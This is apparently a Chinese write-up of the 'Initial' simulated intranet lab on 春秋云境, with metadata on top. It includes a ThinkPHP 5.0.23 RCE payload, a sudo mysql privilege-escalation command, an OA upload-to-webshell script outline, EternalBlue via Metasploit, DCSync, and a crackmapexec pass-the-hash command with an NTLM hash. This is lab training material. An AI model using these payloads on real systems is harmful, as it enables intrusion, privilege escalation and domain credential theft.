---
title: 春秋云境仿真场景WP：Initial
contest: 春秋云境仿真场景
year: 2024
difficulty: easy
vuln_type: rce
tags: [ThinkPHP 5.0.23, sudo mysql提权, frp代理, MS17-010, DCSync, 内网渗透]
attack_chain: ThinkPHP5.0.23 RCE→sudo mysql -e读flag1→frp代理→MS17-010打172.22.1.21→DCSync域管hash→crackmapexec读flag3
key_payload: "_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls;sudo mysql -e '! cat /root/flag/flag01.txt';ms17_010_eternalblue"
one_liner: 春秋云境Initial仿真场景：ThinkPHP5 RCE+MS17-010+DCSync三段式内网
lesson: 入门级内网靶场核心三件套：web RCE入口→MSF永恒之蓝→DCSync域控
quality: medium
---

# 春秋云境仿真场景WP：Initial

**靶场**：春秋云境仿真场景Initial（SecHub社区，2024）

**攻击链**：
1. **入口**：`sudo mysql -e '! cat /root/flag/flag01.txt'` 提权
2. **信呼OA（172.22.1.18）**：admin/admin123登录 → 文件上传Python脚本（upload → qcloudCos任务执行 → 写webshell）
3. **永恒之蓝（172.22.1.21）**：MSF `exploit/windows/smb/ms17_010_eternalblue` + bind_tcp_uuid payload
4. **域控（172.22.1.2）**：kiwi dcsync导出域管 → crackmapexec smb执行读flag3
   - `crackmapexec smb 172.22.1.2 -u administrator -H 10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"`
   - flag: `flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}`

**关键Python脚本**（信呼上传getshell）：
```python
url1 = 'http://172.22.1.18/?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = 'http://172.22.1.18/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = 'http://172.22.1.18/task.php?m=qcloudCos|runt&a=run&fileid=11'
# 登录 → 上传1.php → task.php执行 → 替换.uptemp为.php
```

**质量评估**：中（payload具体但过程叙述较简）
